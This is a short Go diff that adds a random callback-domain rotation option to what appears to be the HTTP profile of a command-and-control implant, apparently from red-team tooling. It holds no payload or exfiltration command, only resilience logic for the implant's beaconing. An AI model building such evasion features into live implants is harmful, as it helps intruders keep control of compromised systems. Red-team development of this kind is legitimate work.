@@ -446,6 +446,8 @@ func (c *C2HTTPx) increaseSuccessfulMessage() {
 		c.CallbackDomainsFailCount[c.CurrentDomain] = 0
 	} else if c.DomainRotationMethod == "round-robin" {
 		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.CallbackDomains)
+	} else if c.DomainRotationMethod == "random" {
+		c.CurrentDomain = rand.Intn(len(c.CallbackDomains))
 	} else {
 		utils.PrintDebug(fmt.Sprintf("unknown domain rotation method: %s\n", c.DomainRotationMethod))
 	}
